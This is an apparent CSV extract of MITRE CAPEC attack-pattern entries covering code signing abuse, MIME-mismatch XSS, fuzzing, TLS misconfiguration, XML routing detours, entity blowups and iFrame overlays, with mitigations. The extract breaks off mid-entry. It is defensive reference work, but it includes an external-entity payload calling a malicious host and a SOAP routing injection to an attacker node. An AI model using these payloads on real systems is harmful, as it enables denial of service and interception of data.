CAPEC-206,Signing Malicious Code,Detailed,Draft,"The adversary extracts credentials used for code signing from a production environment and then uses these credentials to sign malicious content with the developer's key. Many developers use signing keys to sign code or hashes of code. When users or applications verify the signatures are accurate they are led to believe that the code came from the owner of the signing key and that the code has not been modified since the signature was applied. If the adversary has extracted the signing credentials then they can use those credentials to sign their own code bundles. Users or tools that verify the signatures attached to the code will likely assume the code came from the legitimate developer and install or run the code, effectively allowing the adversary to execute arbitrary code on the victim's computer. This differs from CAPEC-673, because the adversary is performing the code signing.",N/A,N/A,Very High,::NATURE:ChildOf:CAPEC ID:444::,"::STEP:1:PHASE:Explore:DESCRIPTION:The adversary first attempts to obtain a digital certificate in order to sign their malware or tools. This certificate could be stolen, created by the adversary, or acquired normally through a certificate authority.::STEP:2:PHASE:Explore:DESCRIPTION:Based on the type of certificate obtained, the adversary will create a goal for their attack. This is either a broad or targeted attack. If an adversary was able to steal a certificate from a targeted organization, they could target this organization by pretending to have legitimate code signed by them. In other cases, the adversary would simply sign their malware and pose as legitimate software such that any user might trust it. This is the more broad approach::STEP:3:PHASE:Experiment:DESCRIPTION:The adversary creates their malware and signs it with the obtained digital certificate. The adversary then checks if the code that they signed is valid either through downloading from the targeted source or testing locally.::STEP:4:PHASE:Exploit:DESCRIPTION:Once the malware has been signed, it is then deployed to the desired location. They wait for a trusting user to run their malware, thinking that it is legitimate software. This malware could do a variety of things based on the motivation of the adversary.::",::The targeted developer must use a signing key to sign code bundles. (Note that not doing this is not a defense - it only means that the adversary does not need to steal the signing key before forging code bundles in the developer's name.)::,N/A,::None: No specialized resources are required to execute this type of attack.::,N/A,N/A,"::Ensure digital certificates are protected and inaccessible by unauthorized uses.::If a digital certificate has been compromised it should be revoked and regenerated.::Even if a piece of software has a valid and trusted digital signature, it should be assessed for any weaknesses and vulnerabilities.::","::In the famous Stuxnet malware incident, two digital certificates were compromised in order to sign malicious device drivers with legitimate credentials. The signing resulted in the malware appearing as trusted by the system it was running on, which facilitated the installation of the malware in kernel mode. This further resulted in Stuxnet remaining undetected for a significant amount of time. [REF-699]::The cyber espionage group CyberKittens leveraged a stolen certificate from AI Squared that allowed them to leverage a signed executable within Operation Wilted Tulip. This ultimately allowed the executable to run as trusted on the system, allowing a Crowd Strike stager to be loaded within the system's memory. [REF-714]::",::732::,TAXONOMY NAME:ATTACK:ENTRY ID:1553.002:ENTRY NAME:Subvert Trust Controls:Code Signing::,N/A,https://capec.mitre.org/data/definitions/206.html
CAPEC-209,XSS Using MIME Type Mismatch,Detailed,Draft,"An adversary creates a file with scripting content but where the specified MIME type of the file is such that scripting is not expected. The adversary tricks the victim into accessing a URL that responds with the script file. Some browsers will detect that the specified MIME type of the file does not match the actual type of its content and will automatically switch to using an interpreter for the real content type. If the browser does not invoke script filters before doing this, the adversary's script may run on the target unsanitized, possibly revealing the victim's cookies or executing arbitrary script in their browser.",N/A,N/A,Medium,::NATURE:ChildOf:CAPEC ID:592::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for stored user-controllable inputs] Using a browser or an automated tool, an adversary follows all public links and actions on a web site. They record all areas that allow a user to upload content through an HTTP POST request. This is typically found in blogs or forums.TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to file upload features:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe identified potential entry points for MIME type mismatch] The adversary uses the entry points gathered in the Explore phase as a target list and uploads files with scripting content, but whose MIME type is specified as a file type that cannot execute scripting content. If the application only checks the MIME type of the file, it may let the file through, causing the script to be executed by any user who accesses the file.TECHNIQUE:Upload a script file with a MIME type of text/plain to a forum and then access the uploaded file to see if the script is executed. If possible, the script displays a unique identifier so the adversary knows for certain it was executed when testing.::STEP:3:PHASE:Experiment:DESCRIPTION:[Store malicious XSS content] Once the adversary has determined which file upload locations are vulnerable to MIME type mismatch, they will upload a malicious script disguised as a non scripting file. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from a victim.TECHNIQUE:Use a tool such as BeEF to store a hook into the web application. This will alert the adversary when the victim has accessed the content and will give the adversary control over the victim's browser, allowing them access to cookies, user screenshot, user clipboard, and more complex XSS attacks.::STEP:4:PHASE:Exploit:DESCRIPTION:[Get victim to view stored content] In order for the attack to be successful, the victim needs to view the stored malicious content on the webpage.TECHNIQUE:Send a phishing email to the victim containing a URL that will direct them to the malicious stored content.:TECHNIQUE:Simply wait for a victim to view the content. This is viable in situations where content is posted to a popular public forum.::",::The victim must follow a crafted link that references a scripting file that is mis-typed as a non-executable file.::The victim's browser must detect the true type of a mis-labeled scripting file and invoke the appropriate script interpreter without first performing filtering on the content.::,N/A,::The adversary must have the ability to source the file of the incorrect MIME type containing a script.::,N/A,N/A,N/A,"::For example, the MIME type text/plain may be used where the actual content is text/javascript or text/html. Since text does not contain scripting instructions, the stated MIME type would indicate that filtering is unnecessary. However, if the target application subsequently determines the file's real type and invokes the appropriate interpreter, scripted content could be invoked.::In another example, img tags in HTML content could reference a renderable type file instead of an expected image file. The file extension and MIME type can describe an image file, but the file content can be text/javascript or text/html resulting in script execution. If the browser assumes all references in img tags are images, and therefore do not need to be filtered for scripts, this would bypass content filters.::",::79::20::646::,N/A,N/A,https://capec.mitre.org/data/definitions/209.html
CAPEC-21,Exploitation of Trusted Identifiers,Meta,Stable,"An adversary guesses, obtains, or rides a trusted identifier (e.g. session ID, resource ID, cookie, etc.) to perform authorized actions under the guise of an authenticated user or service.",N/A,High,High,N/A,"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for Indicators of Susceptibility] Using a variety of methods, until one is found that applies to the target, the adversary probes for cookies, session tokens, or entry points that bypass identifiers altogether.TECHNIQUE:Spider all available pages:TECHNIQUE:Attack known bad interfaces:TECHNIQUE:Search outward-facing configuration and properties files for identifiers.::STEP:2:PHASE:Experiment:DESCRIPTION:[Fetch samples] The adversary fetches many samples of identifiers. This may be through legitimate access (logging in, legitimate connections, etc.) or via systematic probing.TECHNIQUE:An adversary makes many anonymous connections and records the session IDs assigned.:TECHNIQUE:An adversary makes authorized connections and records the session tokens or credentials issued.:TECHNIQUE:An adversary gains access to (legitimately or illegitimately) a nearby system (e.g., in the same operations network, DMZ, or local network) and makes a connection from it, attempting to gain the same privileges as a trusted system.::STEP:3:PHASE:Exploit:DESCRIPTION:[Impersonate] An adversary can use successful experiments or authentications to impersonate an authorized user or system or to laterally move within a system or application::STEP:4:PHASE:Exploit:DESCRIPTION:[Spoofing] Malicious data can be injected into the target system or into a victim user's system by an adversary. The adversary can also pose as a legitimate user to perform social engineering attacks.::STEP:5:PHASE:Exploit:DESCRIPTION:[Data Exfiltration] The adversary can obtain sensitive data contained within the system or application.::",::Server software must rely on weak identifier proof and/or verification schemes.::Identifiers must have long lifetimes and potential for reusability.::Server software must allow concurrent sessions to exist.::,"::SKILL:To achieve a direct connection with the weak or non-existent server session access control, and pose as an authorized user:LEVEL:Low::",::Ability to deploy software on network.::Ability to communicate synchronously or asynchronously with server.::,N/A,::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthenticationTECHNICAL IMPACT:Gain Privileges::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::,"::Design: utilize strong federated identity such as SAML to encrypt and sign identity tokens in transit.::Implementation: Use industry standards session key generation mechanisms that utilize high amount of entropy to generate the session key. Many standard web and application servers will perform this task on your behalf.::Implementation: If the identifier is used for authentication, such as in the so-called single sign on use cases, then ensure that it is protected at the same level of assurance as authentication tokens.::Implementation: If the web or application server supports it, then encrypting and/or signing the identifier (such as cookie) can protect the ID if intercepted.::Design: Use strong session identifiers that are protected in transit and at rest.::Implementation: Utilize a session timeout for all sessions, for example 20 minutes. If the user does not explicitly logout, the server terminates their session after this period of inactivity. If the user logs back in then a new session key is generated.::Implementation: Verify authenticity of all identifiers at runtime.::","::Thin client applications like web applications are particularly vulnerable to session ID attacks. Since the server has very little control over the client, but still must track sessions, data, and objects on the server side, cookies and other mechanisms have been used to pass the key to the session data between the client and server. When these session keys are compromised it is trivial for an adversary to impersonate a user's session in effect, have the same capabilities as the authorized user. There are two main ways for an adversary to exploit session IDs. A brute force attack involves an adversary repeatedly attempting to query the system with a spoofed session header in the HTTP request. A web server that uses a short session ID can be easily spoofed by trying many possible combinations so the parameters session-ID= 1234 has few possible combinations, and an adversary can retry several hundred or thousand request with little to no issue on their side. The second method is interception, where a tool such as wireshark is used to sniff the wire and pull off any unprotected session identifiers. The adversary can then use these variables and access the application.::For example, in a message queuing system that allows service requesters to post messages to its queue through an open channel (such as anonymous FTP), authorization is done through checking group or role membership contained in the posted message. However, there is no proof that the message itself, the information in the message (such group or role membership), or the process that wrote the message to the queue is authentic and authorized to do so.::",::290::302::346::539::6::384::664::602::642::,TAXONOMY NAME:ATTACK:ENTRY ID:1134:ENTRY NAME:Access Token Manipulation::,N/A,https://capec.mitre.org/data/definitions/21.html
CAPEC-215,Fuzzing for application mapping,Detailed,Draft,"An attacker sends random, malformed, or otherwise unexpected messages to a target application and observes the application's log or error messages returned. The attacker does not initially know how a target will respond to individual messages but by attempting a large number of message variants they may find a variant that trigger's desired behavior. In this attack, the purpose of the fuzzing is to observe the application's log and error messages, although fuzzing a target can also sometimes cause the target to enter an unstable state, causing a crash.",N/A,High,Low,::NATURE:ChildOf:CAPEC ID:54::NATURE:ChildOf:CAPEC ID:28::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Observe communication and inputs] The fuzzing adversary observes the target system looking for inputs and communications between modules, subsystems, or systems.TECHNIQUE:Network sniffing. Using a network sniffer such as wireshark, the adversary observes communications into and out of the target system.:TECHNIQUE:Monitor API execution. Using a tool such as ktrace, strace, APISpy, or another debugging tool, the adversary observes the system calls and API calls that are made by the target system, and the nature of their parameters.:TECHNIQUE:Observe inputs using web inspection tools (OWASP's WebScarab, Paros, TamperData, TamperIE, etc.)::STEP:2:PHASE:Experiment:DESCRIPTION:[Generate fuzzed inputs] Given a fuzzing tool, a target input or protocol, and limits on time, complexity, and input variety, generate a list of inputs to try. Although fuzzing is random, it is not exhaustive. Parameters like length, composition, and how many variations to try are important to get the most cost-effective impact from the fuzzer.TECHNIQUE:Boundary cases. Generate fuzz inputs that attack boundary cases of protocol fields, inputs, or other communications limits. Examples include 0xff and 0x00 for single-byte inputs. In binary situations, approach each bit of an individual field with on and off (e.g., 0x80).:TECHNIQUE:Attempt arguments to system calls or APIs. The variations include payloads that, if they were successful, could lead to a compromise on the system.::STEP:3:PHASE:Experiment:DESCRIPTION:[Observe the outcome] Observe the outputs to the inputs fed into the system by fuzzers and see if there are any log or error messages that might provide information to map the application::STEP:4:PHASE:Exploit:DESCRIPTION:[Craft exploit payloads] An adversary usually needs to modify the fuzzing parameters according to the observed error messages to get the desired sensitive information for the application. To defeat correlation, the adversary may try changing the origin IP addresses or client browser identification strings or start a new session from where they left off in obfuscating the attack.TECHNIQUE:Modify the parameters in the fuzzing tool according to the observed error messages. Repeat with enough parameters until the application has been sufficiently mapped.:TECHNIQUE:If the application rejects the large amount of fuzzing messages from the same host machine, the adversary needs to hide the attacks by changing the IP addresses or other credentials.::",::The target application must fail to sanitize incoming messages adequately before processing.::,"::SKILL:Although fuzzing parameters is not difficult, and often possible with automated fuzzing tools, interpreting the error conditions and modifying the parameters so as to move further in the process of mapping the application requires detailed knowledge of target platform, the languages and packages used as well as software design.:LEVEL:Medium::","::Fuzzing tools, which automatically generate and send message variants, are necessary for this attack. The attacker must have sufficient access to send messages to the target. The attacker must also have the ability to observe the target application's log and/or error messages in order to collect information about the target.::",N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Other:NOTE:Confidentiality Other Information Leakage::,"::Design: Construct a 'code book' for error messages. When using a code book, application error messages aren't generated in string or stack trace form, but are catalogued and replaced with a unique (often integer-based) value 'coding' for the error. Such a technique will require helpdesk and hosting personnel to use a 'code book' or similar mapping to decode application errors/logs in order to respond to them normally.::Design: wrap application functionality (preferably through the underlying framework) in an output encoding scheme that obscures or cleanses error messages to prevent such attacks. Such a technique is often used in conjunction with the above 'code book' suggestion.::Implementation: Obfuscate server fields of HTTP response.::Implementation: Hide inner ordering of HTTP response header.::Implementation: Customizing HTTP error codes such as 404 or 500.::Implementation: Hide HTTP response header software information filed.::Implementation: Hide cookie's software information filed.::Implementation: Obfuscate database type in Database API's error message.::","::The following code generates an error message that leaks the full pathname of the configuration file. $ConfigDir = /home/myprog/config;$uname = GetUserInput(username);ExitError(Bad hacker!) if ($uname !~ /^w+$/);$file = $ConfigDir/$uname.txt;if (! (-e $file)) { ExitError(Error: $file does not exist); }... If this code is running on a server, such as a web application, then the person making the request should not know what the full pathname of the configuration directory is. By submitting a username that does not produce a $file that exists, an attacker could get this pathname. It could then be used to exploit path traversal or symbolic link following problems that may exist elsewhere in the application.::In languages that utilize stack traces, revealing them can give adversaries information that allows them to map functions and file locations for an application. The following Java method prints out a stack trace that exposes the application to this attack pattern. public void httpGet(HttpServletRequest request, HttpServletResponse response) {try {processRequest();} catch (Exception ex) {ex.printStackTrace(response.getWriter()); return;}} If this code is running on a server, such as a web application, then the adversary could cause the exception to be printed through fuzzing.::",::209::532::,N/A,N/A,https://capec.mitre.org/data/definitions/215.html
CAPEC-217,Exploiting Incorrectly Configured SSL/TLS,Standard,Draft,An adversary takes advantage of incorrectly configured SSL/TLS communications that enables access to data intended to be encrypted. The adversary may also use this type of attack to inject commands or other traffic into the encrypted stream to cause compromise of either the client or server.,N/A,Low,N/A,::NATURE:ChildOf:CAPEC ID:216::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine SSL/TLS Configuration] Determine the SSL/TLS configuration of either the server or client being targeted, preferably both. This is not a hard requirement, as the adversary can simply assume commonly exploitable configuration settings and indiscriminately attempt them.TECHNIQUE:If the target is a webpage, some of the SSL/TLS configuration can be viewed through the browser's security information, such as the key sizes and cipher being used.::STEP:2:PHASE:Experiment:DESCRIPTION:[Intercept Communication] Provide controlled access to the server by the client, by either providing a link for the client to click on, or by positioning one's self at a place on the network to intercept and control the flow of data between client and server, e.g. AiTM (adversary in the middle - CAPEC-94).TECHNIQUE:Create a malicious webpage that looks identical to the target webpage, but routes client traffic to the server such that the adversary can observe the traffic and perform an adverary in the middle attack.:TECHNIQUE:If the adversary has access to the network that either the client or server is on, the can attempt to use a packet sniffer to perform an adversary in the middle attack.:TECHNIQUE:Install a packet sniffer through malware directly to a client device that can intercept SSL/TLS traffic and perform an adversary in the middle attack.::STEP:3:PHASE:Exploit:DESCRIPTION:[Capture or Manipulate Sensitive Data] Once the adversary has the ability to intercept the secure communication, they exploit the incorrectly configured SSL to view the encrypted communication. The adversary can choose to just record the secure communication or manipulate the data to achieve a desired effect.TECHNIQUE:Use known exploits for old SSL and TLS versions.:TECHNIQUE:Use known exploits for weak ciphers such as DES and RC4.::",::Access to the client/server stream.::,"::SKILL:The adversary needs real-time access to network traffic in such a manner that the adversary can grab needed information from the SSL stream, possibly influence the decided-upon encryption method and options, and perform automated analysis to decipher encrypted material recovered. Tools exist to automate part of the tasks, but to successfully use these tools in an attack scenario requires detailed understanding of the underlying principles.:LEVEL:High::","::The adversary needs the ability to sniff traffic, and optionally be able to route said traffic to a system where the sniffing of traffic can take place, and act upon the recovered traffic in real time.::",N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::,"::Do not use SSL, as all SSL versions have been broken and should not be used. If TLS is not an option for the client or server, consider setting timeouts on SSL sessions to extremely low values to lessen the potential impact.::Only use TLS version 1.2+, as versions 1.0 and 1.1 are insecure.::Configure TLS to use secure algorithms. The current recommendation is to use ECDH, ECDSA, AES256-GCM, and SHA384 for the most security.::","::Using MITM techniques, an adversary launches a blockwise chosen-boundary attack to obtain plaintext HTTP headers by taking advantage of an SSL session using an encryption protocol in CBC mode with chained initialization vectors (IV). This allows the adversary to recover session IDs, authentication cookies, and possibly other valuable data that can be used for further exploitation. Additionally this could allow for the insertion of data into the stream, allowing for additional attacks (CSRF, SQL inject, etc) to occur.::",::201::,N/A,N/A,https://capec.mitre.org/data/definitions/217.html
CAPEC-218,Spoofing of UDDI/ebXML Messages,Detailed,Draft,"An attacker spoofs a UDDI, ebXML, or similar message in order to impersonate a service provider in an e-business transaction. UDDI, ebXML, and similar standards are used to identify businesses in e-business transactions. Among other things, they identify a particular participant, WSDL information for SOAP transactions, and supported communication protocols, including security protocols. By spoofing one of these messages an attacker could impersonate a legitimate business in a transaction or could manipulate the protocols used between a client and business. This could result in disclosure of sensitive information, loss of message integrity, or even financial fraud.",N/A,N/A,Medium,::NATURE:ChildOf:CAPEC ID:148::,N/A,::The targeted business's UDDI or ebXML information must be served from a location that the attacker can spoof or compromise or the attacker must be able to intercept and modify unsecured UDDI/ebXML messages in transit.::,N/A,"::The attacker must be able to force the target user to accept their spoofed UDDI or ebXML message as opposed to the a message associated with a legitimate company. Depending on the follow-on for the attack, the attacker may also need to serve its own web services.::",N/A,N/A,"::Implementation: Clients should only trust UDDI, ebXML, or similar messages that are verifiably signed by a trusted party.::",N/A,::345::,N/A,N/A,https://capec.mitre.org/data/definitions/218.html
CAPEC-219,XML Routing Detour Attacks,Standard,Draft,"An attacker subverts an intermediate system used to process XML content and forces the intermediate to modify and/or re-route the processing of the content. XML Routing Detour Attacks are Adversary in the Middle type attacks (CAPEC-94). The attacker compromises or inserts an intermediate system in the processing of the XML message. For example, WS-Routing can be used to specify a series of nodes or intermediaries through which content is passed. If any of the intermediate nodes in this route are compromised by an attacker they could be used for a routing detour attack. From the compromised system the attacker is able to route the XML process to other nodes of their choice and modify the responses so that the normal chain of processing is unaware of the interception. This system can forward the message to an outside entity and hide the forwarding and processing from the legitimate processing systems by altering the header information.",N/A,High,Medium,::NATURE:ChildOf:CAPEC ID:94::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the target] Using command line or an automated tool, an attacker records all instances of web services to process XML requests.TECHNIQUE:Use automated tool to record all instances to process XML requests or find exposed WSDL.:TECHNIQUE:Use tools to crawl WSDL::STEP:2:PHASE:Experiment:DESCRIPTION:[Identify SOAP messages that have multiple state processing.] Inspect instance to see whether the XML processing has multiple stages or not.TECHNIQUE:Inspect the SOAP message routing head to see whether the XML processing has multiple stages or not.::STEP:3:PHASE:Exploit:DESCRIPTION:[Launch an XML routing detour attack] The attacker injects a bogus routing node (using a WS-Referral service) into the routing table of the XML header of the SOAP message identified in the Explore phase. Thus, the attacker can route the XML message to the attacker controlled node (and access the message contents).TECHNIQUE:The attacker injects a bogus routing node (using a WS-Referral service) into the routing table of the XML header of the SOAP message::",::The targeted system must have multiple stages processing of XML content.::,::SKILL:To inject a bogus node in the XML routing table:LEVEL:Low::,::The attacker must be able to insert or compromise a system into the processing path for the transaction.::,N/A,::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-RepudiationTECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism::,::Design: Specify maximum number intermediate nodes for the request and require SSL connections with mutual authentication.::Implementation: Use SSL for connections between all parties with mutual authentication.::,"::Here is an example SOAP call from a client, example1.com, to a target, example4.com, via 2 intermediaries, example2.com and example3.com. (note: The client here is not necessarily a 'end user client' but rather the starting point of the XML transaction). Example SOAP message with routing information in header: <S:Envelope><S:Header><m:path xmlns:m=http://schemas.example.com/rp/ S:actor=http://schemas.example.com/soap/actor S:mustUnderstand=1><m:action>http://example1.com/</m:action> <m:to>http://example4.com/router</m:to> <m:id>uuid:1235678-abcd-1a2b-3c4d-1a2b3c4d5e6f</m:id> <m:fwd> <m:via>http://example2.com/router</m:via> </m:fwd> <m:rev /></m:path></S:Header> <S:Body>...</S:Body></S:Envelope> Add an additional node (example3.com/router) to the XML path in a WS-Referral message <r:ref xmlns:r=http://schemas.example.com/referral><r:for><r:prefix>http://example2.com/router</r:prefix></r:for> <r:if/> <r:go><r:via>http://example3.com/router</r:via></r:go></r:ref> Resulting in the following SOAP Header: <S:Envelope><S:Header><m:path xmlns:m=http://schemas.example.com/rp/ S:actor=http://schemas.example.com/soap/actor S:mustUnderstand=1><m:action>http://example1.com/</m:action> <m:to>http://example4.com/router</m:to> <m:id>uuid:1235678-abcd-1a2b-3c4d-1a2b3c4d5e6f</m:id> <m:fwd><m:via>http://example2.com/router</m:via> <m:via>http://example3.com/router</m:via></m:fwd> <m:rev /></m:path></S:Header> <S:Body>...</S:Body></S:Envelope> Continuing with this example, the attacker injects a bogus routing node (using a WS-Referral service) into the routing table of the XML header but not access the message directly on the initiator/intermediary node that they have targeted. Example of WS-Referral based WS-Routing injection of the bogus node route: <r:ref xmlns:r=http://schemas.example.com/referral><r:for><r:prefix>http://example2.com/router</r:prefix></r:for> <r:if/> <r:go><r:via>http://evilsite1.com/router</r:via></r:go></r:ref> Resulting XML Routing Detour attack: <S:Envelope><S:Header><m:path xmlns:m=http://schemas.example.com/rp/ S:actor=http://schemas.example.com/soap/actor S:mustUnderstand=1><m:action>http://example_0.com/</m:action> <m:to>http://example_4.com/router</m:to> <m:id>uuid:1235678-abcd-1a2b-3c4d-1a2b3c4d5e6f</m:id> <m:fwd><m:via>http://example2.com/router</m:via> <m:via>http://evilesite1.com/router</m:via> <m:via>http://example3.com/router</m:via></m:fwd> <m:rev /></m:path></S:Header> <S:Body>...</S:Body></S:Envelope> Thus, the attacker can route the XML message to the attacker controlled node (and access to the message contents).::",::441::610::,TAXONOMY NAME:WASC:ENTRY ID:32:ENTRY NAME:Routing Detour::::TAXONOMY NAME:WASC:ENTRY ID:44:ENTRY NAME:XML Entity Expansion::,N/A,https://capec.mitre.org/data/definitions/219.html
CAPEC-22,Exploiting Trust in Client,Meta,Draft,"An attack of this type exploits vulnerabilities in client/server communication channel authentication and data integrity. It leverages the implicit trust a server places in the client, or more importantly, that which the server believes is the client. An attacker executes this type of attack by communicating directly with the server where the server believes it is communicating only with a valid client. There are numerous variations of this type of attack.",N/A,High,High,N/A,N/A,"::Server software must rely on client side formatted and validated values, and not reinforce these checks on the server side.::",::SKILL:The attacker must have fairly detailed knowledge of the syntax and semantics of client/server communications protocols and grammars:LEVEL:Medium::,::Ability to communicate synchronously or asynchronously with server::,N/A,::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::,::Design: Ensure that client process and/or message is authenticated so that anonymous communications and/or messages are not accepted by the system.::Design: Do not rely on client validation or encoding for security purposes.::Design: Utilize digital signatures to increase authentication assurance.::Design: Utilize two factor authentication to increase authentication assurance.::Implementation: Perform input validation for all remote content.::,"::Web applications may use JavaScript to perform client side validation, request encoding/formatting, and other security functions, which provides some usability benefits and eliminates some client-server round-tripping. However, the web server cannot assume that the requests it receives have been subject to those validations, because an attacker can use an alternate method for crafting the HTTP Request and submit data that contains poisoned values designed to spoof a user and/or get the web server to disclose information.::Web 2.0 style applications may be particularly vulnerable because they in large part rely on existing infrastructure which provides scalability without the ability to govern the clients. Attackers identify vulnerabilities that either assume the client side is responsible for some security services (without the requisite ability to ensure enforcement of these checks) and/or the lack of a hardened, default deny server configuration that allows for an attacker probing for weaknesses in unexpected ways. Client side validation, request formatting and other services may be performed, but these are strictly usability enhancements not security enhancements.::Many web applications use client side scripting like JavaScript to enforce authentication, authorization, session state and other variables, but at the end of day they all make requests to the server. These client side checks may provide usability and performance gains, but they lack integrity in terms of the http request. It is possible for an attacker to post variables directly to the server without using any of the client script security checks and customize the patterns to impersonate other users or probe for more information.::Many message oriented middleware systems like MQ Series are rely on information that is passed along with the message request for making authorization decisions, for example what group or role the request should be passed. However, if the message server does not or cannot authenticate the authorization information in the request then the server's policy decisions about authorization are trivial to subvert because the client process can simply elevate privilege by passing in elevated group or role information which the message server accepts and acts on.::",::290::287::20::200::693::,N/A,N/A,https://capec.mitre.org/data/definitions/22.html
CAPEC-221,Data Serialization External Entities Blowup,Detailed,Draft,"This attack takes advantage of the entity replacement property of certain data serialization languages (e.g., XML, YAML, etc.) where the value of the replacement is a URI. A well-crafted file could have the entity refer to a URI that consumes a large amount of resources to create a denial of service condition. This can cause the system to either freeze, crash, or execute arbitrary code depending on the URI.",N/A,N/A,N/A,::NATURE:ChildOf:CAPEC ID:122::NATURE:ChildOf:CAPEC ID:278::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Find target web service] The adversary must first find a web service that takes input data in the form of a serialized language such as XML or YAML.::STEP:2:PHASE:Experiment:DESCRIPTION:[Host malicious file on a server] The adversary will create a web server that contains a malicious file. This file will be extremely large, so that if a web service were to try to load it, the service would most likely hang.::STEP:2:PHASE:Experiment:DESCRIPTION:[Craft malicious data] Using the serialization language that the web service takes as input, the adversary will craft data that links to the malicious file using an external entity reference to the URL of the file.::STEP:4:PHASE:Exploit:DESCRIPTION:[Send serialized data containing URI] The adversary will send specially crafted serialized data to the web service. When the web service loads the input, it will attempt to download the malicious file. Depending on the amount of memory the web service has, this could either crash the service or cause it to hang, resulting in a Denial of Service attack.::",::A server that has an implementation that accepts entities containing URI values.::,N/A,N/A,N/A,::SCOPE:AvailabilityTECHNICAL IMPACT:Resource Consumption::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::,"::This attack may be mitigated by tweaking the XML parser to not resolve external entities. If external entities are needed, then implement a custom XmlResolver that has a request timeout, data retrieval limit, and restrict resources it can retrieve locally.::This attack may be mitigated by tweaking the serialized data parser to not resolve external entities. If external entities are needed, then implement a custom resolver that has a request timeout, data retrieval limit, and restrict resources it can retrieve locally.::","::In this example, the XML parser parses the attacker's XML and opens the malicious URI where the attacker controls the server and writes a massive amount of data to the response stream. In this example the malicious URI is a large file transfer. <?xml version=1.0?>< !DOCTYPE bomb [<!ENTITY detonate SYSTEM http://www.malicious-badguy.com/myhugefile.exe>]><bomb>&detonate;</bomb>::",::611::,TAXONOMY NAME:WASC:ENTRY ID:43:ENTRY NAME:XML External Entities::,N/A,https://capec.mitre.org/data/definitions/221.html
CAPEC-222,iFrame Overlay,Detailed,Draft,"In an iFrame overlay attack the victim is tricked into unknowingly initiating some action in one system while interacting with the UI from seemingly completely different system. While being logged in to some target system, the victim visits the attackers' malicious site which displays a UI that the victim wishes to interact with. In reality, the iFrame overlay page has a transparent layer above the visible UI with action controls that the attacker wishes the victim to execute. The victim clicks on buttons or other UI elements they see on the page which actually triggers the action controls in the transparent overlaying layer. Depending on what that action control is, the attacker may have just tricked the victim into executing some potentially privileged (and most undesired) functionality in the target system to which the victim is authenticated. The basic problem here is that there is a dichotomy between what the victim thinks they are clicking on versus what they are actually clicking on.",N/A,Medium,High,::NATURE:ChildOf:CAPEC ID:103::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Craft an iFrame Overlay page] The attacker crafts a malicious iFrame overlay page.TECHNIQUE:The attacker leverages iFrame overlay capabilities to craft a malicious iFrame overlay page.::STEP:2:PHASE:Exploit:DESCRIPTION:[Attacker tricks victim to load the iFrame overlay page] Attacker utilizes some form of temptation, misdirection or coercion to trick the victim to loading and interacting with the iFrame overlay page in a way that increases the chances that the victim will visit the malicious page.TECHNIQUE:Trick the victim to the malicious site by sending the victim an e-mail with a URL to the site.:TECHNIQUE:Trick the victim to the malicious site by manipulating URLs on a site trusted by the victim.:TECHNIQUE:Trick the victim to the malicious site through a cross-site scripting attack.::STEP:3:PHASE:Exploit:DESCRIPTION:[Trick victim into interacting with the iFrame overlay page in the desired manner] The attacker tricks the victim into clicking on the areas of the UI which contain the hidden action controls and thereby interacts with the target system maliciously with the victim's level of privilege.TECHNIQUE:Hide action controls over very commonly used functionality.:TECHNIQUE:Hide action controls over very psychologically tempting content.::",::The victim is communicating with the target application via a web based UI and not a thick client. The victim's browser security policies allow iFrames. The victim uses a modern browser that supports UI elements like clickable buttons (i.e. not using an old text only browser). The victim has an active session with the target system. The target system's interaction window is open in the victim's browser and supports the ability for initiating sensitive actions on behalf of the user in the target system.::,::SKILL:Crafting the proper malicious site and luring the victim to this site is not a trivial task.:LEVEL:High::,::None: No specialized resources are required to execute this type of attack.::,N/A,::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Authorization Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-RepudiationTECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism::,"::Configuration: Disable iFrames in the Web browser.::Operation: When maintaining an authenticated session with a privileged target system, do not use the same browser to navigate to unfamiliar sites to perform other activities. Finish working with the target system and logout first before proceeding to other tasks.::Operation: If using the Firefox browser, use the NoScript plug-in that will help forbid iFrames.::","::The following example is a real-world iFrame overlay attack [2]. In this attack, the malicious page embeds Twitter.com on a transparent IFRAME. The status-message field is initialized with the URL of the 